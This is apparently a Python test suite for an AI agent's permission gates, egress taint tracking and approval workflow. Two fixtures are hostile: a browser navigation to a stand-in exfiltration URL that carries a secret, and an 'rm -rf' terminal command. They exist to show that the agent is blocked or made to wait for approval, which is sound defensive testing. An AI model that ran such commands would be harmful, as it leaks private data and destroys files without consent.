"""MCP double-underscore naming, permission gates, egress taint propagation, and approval WS contracts."""

from __future__ import annotations

import asyncio
import importlib
import sys
import types
import unittest
from unittest import mock

from _loader import chat_store, ensure_hermes_stubs, load, temp_dir
from test_auth_devices import _companion_pkg


class McpNamingAndPermissionsGateTest(unittest.TestCase):
    def setUp(self):
        _, (self.computer, self.permissions, self.egress) = load("computer", "permissions", "egress")
        pkg = _companion_pkg()
        self.approvals = importlib.import_module(f"{pkg}.approvals")

    def test_double_and_single_underscore_mcp_browser_tools_are_recognized(self):
        for name in ("mcp__browser__browser_navigate", "mcp_browser_browser_navigate", "browser_exec"):
            self.assertTrue(self.computer.is_browser_tool(name), name)
            self.assertEqual(self.permissions.kind_of(name, {"url": "https://example.com"}, None, True), "browse")
        self.assertFalse(self.computer.is_browser_tool("browser_hand_over"))
        self.assertFalse(self.computer.is_browser_tool("browser_request"))

        self.computer.note_action("mcp__browser__browser_navigate", {"url": "https://example.com"}, "chat-1")
        self.assertEqual(self.computer._last_action["verb"], "navigate")

    def test_schedule_command_and_expanded_named_actions_are_classified(self):
        kind = self.permissions.kind_of
        action = self.approvals.approval_action

        # cronjob_manage: list is read-only (None), mutations are gated under "schedule".
        self.assertIsNone(kind("cronjob_manage", {"action": "list"}, None, False))
        self.assertEqual(kind("cronjob_manage", {"action": "create"}, None, False), "schedule")
        self.assertEqual(kind("trigger_remove", {"trigger_id": "t1"}, None, False), "schedule")
        self.assertEqual(kind("process_manage", {"action": "kill"}, None, False), "run_command")

        # Double-underscore MCP read vs write connectors.
        self.assertEqual(kind("mcp__github__list_issues", {}, None, False), "connector_read")
        self.assertEqual(kind("mcp__github__create_issue", {}, None, False), "connector_write")

        # Expanded mail/calendar/message aliases map to canonical frontend ApprovalAction names.
        for tool, expected_action, expected_kind in (
            ("mcp__gmail__delete_email", "delete_emails", "delete"),
            ("mcp__gmail__trash_email", "delete_emails", "delete"),
            ("mcp__outlook__send_mail", "send_email", "send_message"),
            ("mcp__gmail__reply_email", "send_email", "send_message"),
            ("mcp__slack__send_message", "send_email", "send_message"),
            ("mcp__calendar__remove_event", "delete_event", "delete"),
            ("mcp__browser__browser_click", "browser_submit", "payment"),
        ):
            args = {"element": "立即付款"} if "browser_click" in tool else {}
            act = action(tool, args)
            self.assertEqual(act, expected_action, tool)
            self.assertEqual(kind(tool, args, act, "browser" in tool), expected_kind, tool)

    def test_egress_taint_detects_mcp_double_underscore_and_propagates_across_chats(self):
        self.egress.note("sess-gw", "mcp__google_workspace__search_gmail_messages", chat_id="gw-chat")
        self.assertTrue(self.egress.tainted("sess-gw"))
        self.assertTrue(self.egress.chat_tainted("gw-chat"))

        self.egress.note("sess-1", "mcp__email__fetch_thread_body", chat_id="main")
        self.assertTrue(self.egress.tainted("sess-1"))
        self.assertTrue(self.egress.chat_tainted("main"))

        # Main -> helper -> browser_desk propagation.
        self.egress.propagate_chat("main", "helper-chat")
        self.egress.propagate_chat("helper-chat", "desk-chat")
        hit = self.egress.check(
            "fresh-desk-session",
            "mcp__browser__browser_navigate",
            {"url": "https://evil.example/collect?secret=123"},
            chat_id="desk-chat",
        )
        self.assertEqual(hit["host"], "evil.example")


class ActivityEgressPrecedenceAndApprovalContractTest(unittest.TestCase):
    def setUp(self):
        from muse.app import NativeCompanionAdapter
        from muse.runtime import close_all_shared_dbs

        self.addCleanup(close_all_shared_dbs)
        pkg = _companion_pkg()
        self.pkg = pkg
        self.activity = importlib.import_module(f"{pkg}.activity")
        self.approvals_mod = importlib.import_module(f"{pkg}.approvals")
        self.folder = temp_dir("companion-apv-")
        self.ws_frames = []

        class FakeSocket:
            def __init__(self, sink):
                self.sink = sink

            async def send_json(self, frame):
                self.sink.append(frame)

        adapter = NativeCompanionAdapter(home=self.folder, start_background_services=False)
        adapter.store = chat_store(self.folder)
        adapter.approvals = self.approvals_mod.Approvals(adapter, self.folder)
        orch = adapter.engine.helper_orchestrator
        orch._helper_origins = {"helper-1": "main", "desk-1": "helper-1"}
        orch._active_waits = {"helper-1", "desk-1"}
        adapter.socket_devices = {FakeSocket(self.ws_frames): "dev-1"}
        adapter.loop = None
        adapter.companion_name = lambda: "伙伴"
        submitted = []

        async def submit_internal(chat_id, text):
            submitted.append((chat_id, text))
            return "t-internal"

        adapter.submit_internal = submit_internal
        self.adapter = adapter
        self.submitted = submitted

    def test_browser_submit_allow_cannot_bypass_send_private_when_tainted(self):
        from unittest.mock import patch

        with (
            patch.object(self.activity, "_adapter", self.adapter),
            patch.object(self.activity, "_chat_for_session", return_value="main"),
            patch.object(self.activity.computer, "holding", return_value=False),
            patch.object(self.activity.computer, "ensure_browser", return_value=True),
            patch.object(self.activity.computer, "status", return_value={"page": {"url": "https://form.example/post", "title": "表单"}}),
            patch.object(self.approvals_mod, "_open_page", return_value={"url": "https://form.example/post", "title": "表单"}),
            patch.object(
                self.activity.permissions,
                "levels",
                return_value={
                    "browse": "allow",
                    "browser_submit": "allow",
                    "send_private": "ask",
                    "payment": "ask",
                },
            ),
        ):
            self.activity.egress.note("s-tainted", "mcp__email__read_mail", chat_id="main")
            code = "fill_input('#q', 'private mail'); n='提交'; click_at_xy(10, 10)"
            res = self.activity.on_pre_tool_call(
                "browser_exec", {"code": code}, session_id="s-tainted", tool_call_id="call-1"
            )
            self.assertIsNotNone(res)
            self.assertEqual(res["action"], "block")
            records = self.adapter.approvals.store.list_for_session("websocket:main")
            self.assertEqual(len(records), 1)
            self.assertEqual(records[0].action, "send_private")
            self.assertEqual(records[0].public()["context"]["egress"]["host"], "form.example")

    def test_exec_approval_routes_via_facing_chat_normalizes_fields_and_emits_ws_updates(self):
        from muse.context import TurnExecutionContext
        from muse.interceptors import NativeApprovalCoordinator, ToolInvocation

        async def scenario():
            self.adapter.loop = asyncio.get_running_loop()
            self.adapter.set_active_turn("main", "t-main")
            coord_exec = NativeApprovalCoordinator(
                exec_runner=lambda _call: '{"ok": true}',
                approvals=self.adapter.approvals,
                adapter=self.adapter,
            )
            self.adapter.approvals.bind_native_coordinator(coord_exec)
            # Desk -> Helper -> Main: exec prompt in desk-1 must land in "main", not hidden desk-1!
            facing = self.adapter.facing_chat("desk-1")
            self.assertEqual(facing, "main")
            inv = ToolInvocation(
                call_id="exec_1",
                tool_name="terminal",
                arguments={"command": "rm -rf ./tmp_build"},
                ctx=TurnExecutionContext(chat_id="desk-1", facing_chat_id=facing, session_id="native-sess-9"),
            )
            hold_task = asyncio.create_task(
                coord_exec.hold_and_await_exec(
                    inv, command="rm -rf ./tmp_build", reason="destructive delete", facing_chat=facing, timeout_s=5.0
                )
            )
            await asyncio.sleep(0.05)

            main_records = self.adapter.approvals.store.list_for_session("websocket:main")
            self.assertEqual(len(main_records), 1)
            pub = main_records[0].public()
            self.assertIsInstance(pub["expires_at_ms"], int)
            self.assertGreater(pub["expires_at_ms"], pub["created_at_ms"])
            await self.adapter.approvals.decide(main_records[0].id, True, "once")
            ok_exec, _, _ = await hold_task
            self.assertTrue(ok_exec)

            # Mail & delete_emails normalization on public() without mutating raw stored arguments.
            mail_rec = self.adapter.approvals.store.create(
                session_key="websocket:main",
                call_id="c-mail",
                tool_name="mcp__gmail__send_mail",
                action="send_email",
                arguments={"to": "Alice@Example.com, bob@example.com", "subject": "你好"},
            )
            mail_pub = mail_rec.public()
            self.assertEqual(mail_pub["arguments"]["recipients"], ["Alice@Example.com", "bob@example.com"])
            self.assertEqual(mail_pub["scopes"], ["once", "24h"])
            self.assertIn("Alice@Example.com", self.approvals_mod.describe_approval(mail_rec))
            # Stored arguments keep original "to" for tool execution.
            self.assertEqual(self.adapter.approvals.store.get(mail_rec.id).arguments["to"], "Alice@Example.com, bob@example.com")

            del_rec = self.adapter.approvals.store.create(
                session_key="websocket:main",
                call_id="c-del",
                tool_name="mcp__gmail__delete_email",
                action="delete_emails",
                arguments={"email_ids": [101, 202]},
            )
            self.assertEqual(del_rec.public()["arguments"]["email_ids"], ["101", "202"])
            self.assertIsNone(del_rec.public()["expires_at_ms"])

            # Atomic claim_pending & WS broadcast on decide() via NativeApprovalCoordinator.
            coord = NativeApprovalCoordinator(
                exec_runner=lambda _call: '{"ok": true}',
                approvals=self.adapter.approvals,
                adapter=self.adapter,
            )
            self.adapter.approvals.bind_native_coordinator(coord)
            r1, r2 = await asyncio.gather(
                self.adapter.approvals.decide(mail_rec.id, True, "24h"),
                self.adapter.approvals.decide(mail_rec.id, False, "once"),
            )
            winners = [r for r in (r1, r2) if r is not None]
            self.assertEqual(len(winners), 1)
            self.assertEqual(winners[0].status, "executed")
            self.assertTrue(self.adapter.approvals.granted("send_email", {"to": "alice@example.com,bob@example.com"}))

            events = [f for f in self.ws_frames if f.get("event") == "approval_updated"]
            self.assertGreaterEqual(len(events), 2)
            self.assertEqual(events[-1]["approval_id"], mail_rec.id)
            self.assertEqual(events[-1]["status"], "executed")
            self.assertEqual(events[-1]["chat_id"], "main")

        asyncio.run(scenario())

    def test_pending_browser_approval_keeps_browser_open_and_ensures_browser_on_decide(self):
        comp = importlib.import_module(f"{self.pkg}.modules.computer")
        closed = []
        ensured = []
        self.addCleanup(setattr, comp, "close_browser", comp.close_browser)
        self.addCleanup(setattr, comp, "ensure_browser", comp.ensure_browser)
        comp.close_browser = lambda: closed.append(True) or True
        comp.ensure_browser = lambda: ensured.append(True) or True

        comp.note_action("mcp__browser__browser_navigate", {"url": "https://shop.example"}, "main")
        self.adapter.approvals.defer(
            "main", "call_buy", "mcp__browser__browser_click", {"element": "提交订单"}, "browser_submit"
        )
        pending_id = self.adapter.approvals.store.list_for_session("websocket:main")[0].id

        # Turn ends while approval card is still pending -> shared browser must stay open!
        comp.close_after_task("main")
        self.assertEqual(closed, [])

        # Approving the card ensures browser is running before executing the click.
        from muse.interceptors import NativeApprovalCoordinator

        coord = NativeApprovalCoordinator(
            exec_runner=lambda _call: '{"clicked": true}',
            approvals=self.adapter.approvals,
            adapter=self.adapter,
        )
        self.adapter.approvals.bind_native_coordinator(coord)
        decided = asyncio.run(self.adapter.approvals.decide(pending_id, True, "once"))
        self.assertEqual(decided.status, "executed")
        self.assertEqual(len(ensured), 1)

        # Once no pending browser approvals remain, close_after_task closes cleanly.
        comp.close_after_task("main")
        self.assertEqual(len(closed), 1)


if __name__ == "__main__":
    unittest.main()
